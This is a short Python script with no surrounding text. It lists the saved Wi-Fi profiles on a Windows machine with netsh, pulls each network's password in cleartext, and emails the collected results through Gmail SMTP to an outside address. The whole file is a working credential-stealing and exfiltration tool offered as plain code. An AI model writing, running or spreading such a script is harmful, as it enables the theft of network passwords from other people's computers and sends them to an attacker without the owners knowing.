import subprocess
import smtplib
import re

def send_mail(message):
    smtp_obj = smtplib.SMTP('smtp.gmail.com',587)
    smtp_obj.starttls()
    smtp_obj.login("src@gmail.com","<app pass>")
    smtp_obj.sendmail("src@gmail.com","target@gmail.com", message)
    smtp_obj.quit()

command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)
networks = networks.decode('utf-8')
networks = re.findall("(?:Profile\s*:\s)(.*)", networks)

def write_to_local(message):
    stat = "" #C:\Windows\Temp\
    with open("exec_log.txt","at") as file_obj:
        file_obj.write(message)
        
        

res = ""
for net in networks:
    try:
        exec_pass = "netsh wlan show profile "+net+" key=clear"
        passw = subprocess.check_output(exec_pass, shell=True)
        passw = passw.decode('utf-8')
        res += passw
    except:
        continue

print(res)
send_mail(res)
